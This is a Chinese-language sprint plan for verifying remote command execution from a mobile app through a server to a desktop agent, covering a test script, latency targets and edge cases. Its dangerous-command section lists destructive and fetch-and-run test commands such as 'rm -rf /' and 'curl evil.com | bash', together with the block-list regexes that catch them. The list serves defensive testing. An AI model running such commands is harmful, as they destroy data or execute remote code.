# Sprint 6 Phase 3: 端到端命令执行

> **前置条件**: Phase 0 (安全) ✅ + Phase 1 (Docker + Strategy) ✅ + Phase 2 (联调) ✅
>
> **目标**: Mobile 发命令 → Server WS → Desktop 接收 → OpenClaw Agent 执行 → 结果回传 → Mobile 显示
>
> **关键发现**: 端到端链路的代码在 Sprint 1-2 已全部实现，Phase 3 的核心工作是**验证 + 补全可观测性 + 修复集成缝隙**。
>
> **实施状态**: Task 3.2 (source 字段传递) ✅ 已实施 (2026-03-19)。Tasks 3.1/3.3/3.4/3.5 为手动验证任务，需启动完整环境执行。

---

## 当前状态

### 已实现的完整链路

```
Mobile (Flutter)                    Server (NestJS)                     Desktop (Electron)
─────────────────                   ───────────────                     ──────────────────
CommandPage                         DeviceGateway                       WsClientService
  ↓ executeCommand()                  ↓ handleCommandSend()               ↓ handleCommandExecute()
  ↓                                   ↓                                   ↓
WsService ─── device:command:send ──→ 危险命令过滤 (15 regex)            ↓
  ↓                                   ↓ CommandsService.create()         命令黑名单 (11 regex)
  ↓                                   ↓ status: PENDING                  ↓
  ↓ ←── device:command:ack ──────── emit('device:command:execute')     CommandExecutor.execute()
  ↓ (state → waiting)                ↓ to room d-{deviceId}             ↓
  ↓                                   ↓                                 OpenClaw? → chat(msg, {timeout})
  ↓                                   ↓                                   ↓ stream tool_result/text/error
  ↓                                   ↓                                 fallback → child_process.exec()
  ↓                                   ↓                                   ↓
  ↓                                 handleResultComplete()              emitResult()
  ↓                                   ↓ CommandsService.complete()        ↓
  ↓ ←── device:result:delivered ──← emit to room u-{userId}          ←── device:result:complete
  ↓ (state → completed)              ↓ Agent pipeline event
CommandResultCard                     ↓ 'device.result.complete'
  - output / exitCode                 ↓ → Predictive / Supervisor
```

### 各组件就绪度

| 组件 | 代码 | 测试 | 端到端 | 备注 |
|------|------|------|--------|------|
| Mobile CommandPage | ✅ | — | ❌ 未验证 | UI + 状态机完整 |
| Mobile WsService (`/device`) | ✅ | — | ❌ 未验证 | `sendCommand()` + 3 listeners |
| Server DeviceGateway | ✅ | ✅ 单元测试 | ❌ 未验证 | 15 条危险命令正则 |
| Server CommandsService | ✅ | ✅ | ❌ | CRUD + status update |
| Desktop WsClientService | ✅ | — | ❌ 未验证 | `device:command:execute` listener |
| Desktop CommandExecutor | ✅ | — | ❌ 未验证 | OpenClaw 流式 + child_process fallback |
| Desktop command-blacklist | ✅ | — | — | 11 条 defense-in-depth |
| ws-protocol 类型 | ✅ | — | — | `DeviceCommandPayload`, `DeviceResultPayload` |

### 已知缝隙

| # | 问题 | 影响 | 优先级 |
|---|------|------|--------|
| G1 | Desktop 返回的 `CommandResult.source` 字段未传给 Server | Server 无法区分 OpenClaw vs child_process | P1 |
| G2 | `device:result:progress` 已定义但未使用 | 长时间命令无进度反馈 | P2 |
| G3 | 命令取消功能未完整实现 | 无法中止执行中的命令 | P3 |
| G4 | Server 未限流 | 可以无限频率发命令 | P2 |
| G5 | Agent pipeline (`device.result.complete`) 未接 PredictiveService | 命令失败不触发预测建议 | Phase 4 |

---

## 任务 3.1: 端到端链路验证

**目标**: 在真实环境中（Docker + Server + Desktop + Mobile）验证完整命令执行链路。

### 3.1.1 环境启动清单

```bash
# ① Docker 基础设施
docker compose up -d          # postgres, redis, minio, openclaw
docker ps                     # 确认 4 个容器 healthy

# ② Server
cd apps/server && pnpm dev    # NestJS http://localhost:3008
# 日志应显示:
#   Gateway Manager initialized (mode: single)
#   Single container mode: ws://127.0.0.1:18790

# ③ Desktop
cd apps/desktop && pnpm dev   # Electron
# DevTools Main Console 日志应显示:
#   [WS] Connected to /device namespace
#   [OpenClaw] Connecting to Gateway at ws://127.0.0.1:18790
#   [OpenClaw] Connected to Gateway successfully

# ④ Mobile (二选一)
cd apps/mobile && flutter run                    # 真机/模拟器
# 或 通过 curl 模拟 Mobile 调用（见 3.1.3）
```

### 3.1.2 OpenClaw 路径测试（Happy Path）

**前提**: Desktop 已连接 OpenClaw Gateway（DevTools 显示 `Connected to Gateway successfully`）

**操作**: Mobile CommandPage 输入 `echo openclaw-phase3-test` → Run

**期望**:
1. Mobile 状态: `sending` → `waiting` → `completed`
2. Server 日志: 命令 dispatched, result complete
3. Desktop 日志: `[CommandExecutor] OpenClaw execution` 或 `[OpenClaw] ...`
4. Mobile 结果卡片: output 包含 `openclaw-phase3-test`
5. 数据库: Command 记录 status = `COMPLETED`

### 3.1.3 curl 模拟 Mobile（无需真机）

如果 Mobile 环境不方便，可用 curl 通过 Socket.IO 测试。但 Socket.IO 不支持纯 HTTP，
推荐使用 Node.js 脚本模拟:

**文件**: `apps/server/scripts/test-e2e-command.ts`（仅用于手动验证，不提交）

```typescript
import { io } from 'socket.io-client';

const API_URL = 'http://localhost:3008';

// 1. 登录获取 token
async function login(username: string, password: string) {
  const res = await fetch(`${API_URL}/api/v1/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password }),
  });
  return res.json();
}

// 2. 连接 /device namespace
async function testCommand() {
  const { data } = await login('your-username', 'your-password');
  const token = data.accessToken;

  const socket = io(`${API_URL}/device`, {
    auth: { token },
    query: { deviceType: 'mobile' },
    transports: ['websocket'],
  });

  socket.on('connect', () => console.log('Connected to /device'));

  // 3. 监听结果
  socket.on('device:command:ack', (data) => {
    console.log('ACK:', JSON.stringify(data, null, 2));
  });

  socket.on('device:result:delivered', (data) => {
    console.log('RESULT:', JSON.stringify(data, null, 2));
    socket.disconnect();
  });

  // 4. 发送命令
  const targetDeviceId = '<your-desktop-device-id>';  // 从 GET /api/v1/devices 获取

  setTimeout(() => {
    const envelope = {
      requestId: `test_${Date.now()}`,
      timestamp: new Date().toISOString(),
      data: {
        commandId: `test_${Date.now()}`,
        targetDeviceId,
        type: 'shell',
        action: 'echo openclaw-phase3-test',
        timeout: 30000,
      },
    };

    console.log('Sending command...');
    socket.emit('device:command:send', envelope, (response: any) => {
      console.log('Server response:', JSON.stringify(response, null, 2));
    });
  }, 1000);

  // 5. 超时
  setTimeout(() => {
    console.error('TIMEOUT: No result in 30 seconds');
    socket.disconnect();
  }, 30000);
}

testCommand().catch(console.error);
```

### 3.1.4 降级路径测试

```bash
# 1. 停止 OpenClaw 容器
docker stop linkingchat-openclaw

# 2. 发送命令 "echo fallback-test"
#    Desktop 日志应显示:
#    [CommandExecutor] OpenClaw execution failed, falling back to child_process
#    或 OpenClaw client not connected → 直接走 child_process

# 3. 结果验证
#    - source: 'child_process'（如果 source 字段已传回 Server，见 3.2）
#    - output 包含 "fallback-test"

# 4. 重启容器
docker start linkingchat-openclaw
```

### 3.1.5 验收清单

- [ ] OpenClaw 模式: `echo test` 成功执行并返回结果
- [ ] child_process 降级: Gateway 停止后命令仍可执行
- [ ] 端到端延迟 < 3 秒（从 Mobile 发送到结果显示）
- [ ] 数据库 Command 记录正确（status, result, completedAt）
- [ ] Desktop 命令日志（CommandLog 组件）显示执行记录

---

## 任务 3.2: 补全 `source` 字段传回 Server ✅

**问题 (G1)**: Desktop 的 `CommandResult` 包含 `source: 'openclaw' | 'child_process'`，
但 `handleCommandExecute()` 构建 `emitResult()` 参数时没有传递此字段。
Server 和 Mobile 无法知道命令是通过 OpenClaw 还是 child_process 执行的。

### 3.2.1 修改 ws-protocol 类型 ✅

**文件**: `packages/ws-protocol/src/payloads/device.payloads.ts`

在 `DeviceResultPayload` 接口末尾添加可选字段:

```typescript
/** Execution backend: 'openclaw' (preferred) or 'child_process' (fallback) */
source?: 'openclaw' | 'child_process';
```

> **注意**: 修改后需 `cd packages/ws-protocol && pnpm run build` 重新编译，
> 否则 server 的 tsc 会报 `Property 'source' does not exist on type 'DeviceResultPayload'`。

### 3.2.2 修改 Desktop handleCommandExecute ✅

**文件**: `apps/desktop/src/main/services/ws-client.service.ts`

**改动点**: `handleCommandExecute()` 方法末尾构建 `emitResult()` 参数时，添加 `source: result.source`。

> **Review 修正**: 计划原稿说修改 `emitResult()` 本身，但 `emitResult()` 已经直接透传参数。
> 实际改动点在 `handleCommandExecute()` 中调用 `emitResult()` 的参数构建处。

### 3.2.3 Server 持久化 source ✅

**文件**: `apps/server/src/gateway/device.gateway.ts`

**改动点**: `handleResultComplete()` 方法中构建传给 `commandsService.complete()` 的 `data` 对象时，
添加 `source: result.source`。

> **Review 修正**: 计划原稿说修改 `commands.service.ts`，但实际 `complete()` 只是透传 JSON。
> 改动点在 `device.gateway.ts` 中构建 `data` 对象的位置。`commands.service.ts` 无需修改。

### 3.2.4 测试结果

```
Server 单元测试: 370/370 passed (5 pre-existing failures unchanged)
类型检查:
  - ws-protocol: ✅ pass
  - server: ✅ pass (0 new errors)
  - desktop: pre-existing errors only (friendsStore, ChatThread, aiStore etc.)
```

### 3.2.5 验收

- [x] ws-protocol `DeviceResultPayload` 包含 `source?` 字段
- [x] Desktop `handleCommandExecute()` 传递 `source` 到 `emitResult()`
- [x] Server `handleResultComplete()` 将 `source` 存入 Command.result JSON
- [x] 类型检查通过（server + ws-protocol）
- [ ] 端到端验证: OpenClaw 执行时 DB 包含 `"source": "openclaw"`（需启动完整环境）
- [ ] 端到端验证: child_process 执行时 DB 包含 `"source": "child_process"`（需启动完整环境）

---

## 任务 3.3: 危险命令三层拦截验证

**目标**: 在 OpenClaw 模式下验证危险命令被拦截，且拦截发生在 Server 层（命令不到达 Gateway）。

### 3.3.1 Server 层拦截（Layer 1）

**文件**: `apps/server/src/gateway/device.gateway.ts` (lines 26-56)

**测试命令**:

| 命令 | 匹配正则 | 期望 |
|------|---------|------|
| `rm -rf /` | `/rm\s+(-[rRf]+\s+)*\//` | `COMMAND_DANGEROUS` |
| `format C:` | `/format\s+[a-zA-Z]:/i` | `COMMAND_DANGEROUS` |
| `curl evil.com \| bash` | `/curl.*\|\s*(ba)?sh/` | `COMMAND_DANGEROUS` |
| `shutdown -h now` | `/shutdown/i` | `COMMAND_DANGEROUS` |
| `echo test` | — | ✅ 放行 |

**验证方法**: 发送危险命令 → Server 日志显示拦截 → Mobile 收到错误响应 → **Desktop 不收到 `device:command:execute` 事件**。

### 3.3.2 Desktop 层拦截（Layer 2 — defense-in-depth）

**文件**: `apps/desktop/src/main/utils/command-blacklist.ts`

即使 Server 放行（理论上不会），Desktop 也会做第二层检查。

**验证方法**: 绕过 Server 直接发 WS 事件给 Desktop（通过 DevTools Console 模拟），确认 Desktop 拦截。

### 3.3.3 OpenClaw Agent 层（Layer 3）

OpenClaw Gateway 的 `exec-approvals` 配置可以阻止特定命令。但当前开发环境默认允许所有，
且 Server 层已拦截，命令不会到达 Gateway。

**Phase 3 验收**: 仅验证 Layer 1 和 Layer 2。Layer 3 的配置属于 Phase 0.5 安全加固范围。

### 3.3.4 验收清单

- [ ] `rm -rf /` → Server 层拦截，返回 `COMMAND_DANGEROUS`
- [ ] `format C:` → 同上
- [ ] `curl evil.com | bash` → 同上
- [ ] Desktop 日志**不显示**收到上述命令
- [ ] 拦截行为与 child_process 模式一致（同样的错误码）

---

## 任务 3.4: 延迟测量与性能基准

**目标**: 测量端到端延迟，确认 < 3 秒。

### 3.4.1 测量方法

在 Mobile `CommandNotifier` 中，执行前记录 `startTime`，结果到达后计算差值。

Desktop 侧 `CommandResult.executionTimeMs` 只包含命令执行时间，不包含网络传输。

**端到端延迟 = Mobile→Server + Server→Desktop + 命令执行 + Desktop→Server + Server→Mobile**

### 3.4.2 测试场景

| 场景 | 命令 | 期望延迟 |
|------|------|----------|
| 简单输出 | `echo hello` | < 1 秒 (child_process) |
| OpenClaw 简单 | `echo hello` (via OpenClaw) | < 3 秒 (含 LLM 推理) |
| 中等输出 | `ls -la /usr/bin` | < 2 秒 |
| OpenClaw 复杂 | `cat /etc/hosts` (via OpenClaw) | < 5 秒 |
| 超大输出 | `seq 10000` | < 3 秒 (512KB buffer limit) |
| 超时 | `sleep 60` | 30 秒后 timeout |

### 3.4.3 验收

- [ ] `echo hello` (child_process) 端到端 < 1 秒
- [ ] `echo hello` (OpenClaw) 端到端 < 3 秒
- [ ] `sleep 60` 正确超时（30 秒），Mobile 显示 error

---

## 任务 3.5: 边界场景测试

### 3.5.1 Desktop 断开重连

```
场景: Desktop 正在执行命令时 WS 断开
期望:
  - Desktop 自动重连 (1s–30s backoff)
  - 已执行的命令结果尝试重新发送
  - Mobile 30s 超时后显示 error
```

### 3.5.2 多 Desktop 设备

```
场景: 同一用户登录两个 Desktop 设备
操作: Mobile 发命令到 Device A
期望:
  - 只有 Device A 收到 `device:command:execute`（Socket.IO room `d-{deviceId}`）
  - Device B 不执行
```

### 3.5.3 设备离线

```
场景: 目标 Desktop 设备离线
操作: Mobile 发命令
期望:
  - Server 存储 Command (PENDING)
  - 命令发到空 room → 无人接收
  - Mobile 30s 超时
  - 注: 当前无"设备离线"主动拒绝，命令会静默超时
```

### 3.5.4 大输出截断

```
场景: 命令输出超过 512KB (MAX_OUTPUT_SIZE)
操作: 发送 `yes | head -200000`
期望:
  - child_process: maxBuffer 截断，返回部分输出
  - OpenClaw: Agent 可能返回摘要而非原始输出
```

### 3.5.5 JWT 过期

```
场景: Desktop 的 JWT token 过期
操作: 等待 token 过期 → 发送命令
期望:
  - Desktop WS 自动刷新 token（refreshToken）
  - 或断开后重连
```

### 3.5.6 验收清单

- [ ] Desktop 断开重连后可继续接收命令
- [ ] 多设备场景下命令路由正确
- [ ] 设备离线时 Mobile 合理超时
- [ ] 大输出被截断，不导致 OOM
- [ ] JWT 刷新机制正常工作

---

## 改动文件汇总

| 文件 | 任务 | 改动类型 | 说明 |
|------|------|----------|------|
| `packages/ws-protocol/src/payloads/device.payloads.ts` | 3.2 | 修改 | 添加 `source?` 字段 |
| `apps/desktop/src/main/services/ws-client.service.ts` | 3.2 | 修改 | `emitResult()` 传递 source |
| `apps/server/src/gateway/device.gateway.ts` | 3.2 | 修改 | `handleResultComplete()` 将 source 存入 Command.result |
| `apps/server/scripts/test-e2e-command.ts` | 3.1 | 新建(临时) | E2E 验证脚本（不提交） |

> **注意**: Phase 3 的代码改动极少（仅 3.2 的 source 字段传递），主要工作是**端到端验证**。

---

## 执行顺序

```
任务 3.1: 端到端链路验证        (60 min)  ← 启动全部服务，验证 happy path
  ↓
任务 3.2: source 字段传回       (20 min)  ← 3 个文件小改动 + 验证
  ↓
任务 3.3: 危险命令拦截验证      (20 min)  ← 5 个测试命令
  ↓
任务 3.4: 延迟测量              (15 min)  ← 记录 6 个场景的实际延迟
  ↓
任务 3.5: 边界场景测试          (30 min)  ← 断连、多设备、离线、超时
  ↓
更新文档                        (10 min)
```

---

## 完整验收矩阵

| # | 场景 | 任务 | 期望 |
|---|------|------|------|
| E1 | OpenClaw 模式 `echo test` | 3.1 | output=test, source=openclaw |
| E2 | child_process 降级 | 3.1 | output=test, source=child_process |
| E3 | 端到端延迟 (child_process) | 3.4 | < 1 秒 |
| E4 | 端到端延迟 (OpenClaw) | 3.4 | < 3 秒 |
| E5 | Server `source` 持久化 | 3.2 | Command.result 包含 source |
| E6 | `rm -rf /` 拦截 | 3.3 | COMMAND_DANGEROUS |
| E7 | Desktop 不收到危险命令 | 3.3 | 无 `device:command:execute` 日志 |
| E8 | Desktop 断连后重连 | 3.5 | 可继续接收命令 |
| E9 | 多设备正确路由 | 3.5 | 只有目标设备执行 |
| E10 | 命令超时 | 3.5 | 30s 后 Mobile 显示 error |
| E11 | 大输出截断 | 3.5 | 不 OOM，返回部分输出 |

---

## 与 Phase 4 的衔接

Phase 3 完成后，端到端命令执行链路完全打通:
- Mobile → Server → Desktop → OpenClaw Agent → 结果回传 → Mobile ✅
- 危险命令拦截 ✅
- 降级机制 ✅
- 可观测性（source 字段）✅

Phase 4 (Predictive 链路) 的依赖点:
1. **`device.result.complete` 事件** — Phase 3 已验证此事件在命令完成后正确触发
2. **PredictiveService.analyzeTrigger()** — 需要接入 DeviceGateway（Phase 4 Task 4.1）
3. **命令上下文** — Phase 3 的 Command.result 包含 output + exitCode，供 Predictive 分析
